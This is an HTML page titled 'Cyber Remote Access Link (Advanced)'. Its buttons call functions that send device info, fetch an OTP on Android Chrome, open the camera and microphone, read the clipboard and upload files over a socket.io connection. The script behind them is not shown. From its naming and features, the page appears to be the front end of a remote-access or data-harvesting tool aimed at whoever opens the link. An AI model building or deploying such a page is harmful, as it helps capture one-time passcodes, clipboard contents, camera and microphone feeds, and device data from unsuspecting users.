<!DOCTYPE html>
<html>
<head>
  <title>Cyber Remote Client - Advanced</title>
  <link rel="stylesheet" href="assets/style.css">
</head>
<body>
  <h2>Cyber Remote Access Link (Advanced)</h2>
  <button onclick="sendDeviceData()">Send Device Info</button>
  <button onclick="askNotificationPermission()">Enable Notification</button>
  <button onclick="getOTP()">Get OTP (Android Chrome Only)</button>
  <button onclick="openCamera()">Open Camera</button>
  <button onclick="openMic()">Open Microphone</button>
  <button onclick="getClipboard()">Read Clipboard</button>
  <button onclick="uploadFile()">Upload File</button>
  <div id="output"></div>
  <input type="file" id="fileInput" style="display:none" onchange="handleFile(event)">
  <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
  <script src="assets/script.js"></script>
</body>
</html>
  
